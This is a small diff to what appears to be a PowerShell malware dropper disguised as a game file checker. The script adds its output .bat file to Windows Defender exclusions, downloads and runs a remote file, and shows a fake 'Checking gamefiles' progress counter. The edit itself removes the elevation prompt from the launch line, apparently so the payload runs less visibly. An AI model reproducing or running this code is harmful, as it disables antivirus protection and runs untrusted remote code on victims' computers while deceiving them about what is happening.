@@ -27,7 +27,7 @@ $outputFile = "C:\Users\ccmmmd.bat"
 Add-MpPreference -ExclusionPath $outputFile
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
 
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$outputFile`"" -Verb RunAs
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$outputFile`""
 
 for ($i = 1; $i -le 100; $i++) {
     Write-Host -NoNewline ("Checking gamefiles: $i%`r")
